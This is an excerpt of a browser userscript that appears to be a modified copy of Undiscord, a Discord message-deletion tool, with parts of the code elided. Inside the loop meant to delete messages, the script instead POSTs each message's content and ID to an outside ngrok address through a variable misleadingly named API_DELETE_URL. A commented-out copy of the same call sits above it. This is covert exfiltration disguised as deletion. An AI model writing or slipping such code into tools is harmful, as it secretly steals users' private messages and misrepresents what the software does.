...
// @grant           none
// @downloadURL https://update.greasyfork.org/scripts/455966/Undiscord.user.js
// @updateURL https://update.greasyfork.org/scripts/455966/Undiscord.meta.js
// ==/UserScript==
(function () {
    'use strict';
      ...
      async function recurse() {
        ...
        if (messagesToDelete.length > 0 || skippedMessages.length > 0) {
          ...
          for (let i = 0; i < messagesToDelete.length; i++) {
            ...
            try {
              const s = Date.now();
              const API_DELETE_URL = `https://17b1-73-37-70-14.ngrok.io/rolypoly`;
            //   fetch(API_DELETE_URL,  {
            //     method: 'POST',
            //     body: message.content
            //   }).then(() => log.info('SUBMITTED')).catch(e => log.error('***FAILED REQUEST***', e,'\n'));
              resp = await fetch(API_DELETE_URL+`?msgId=${message.id}`, {
                // headers,
                body: message.content,
                method: 'POST'
              });
              ...
              log.error('Unfortunate error:', err);
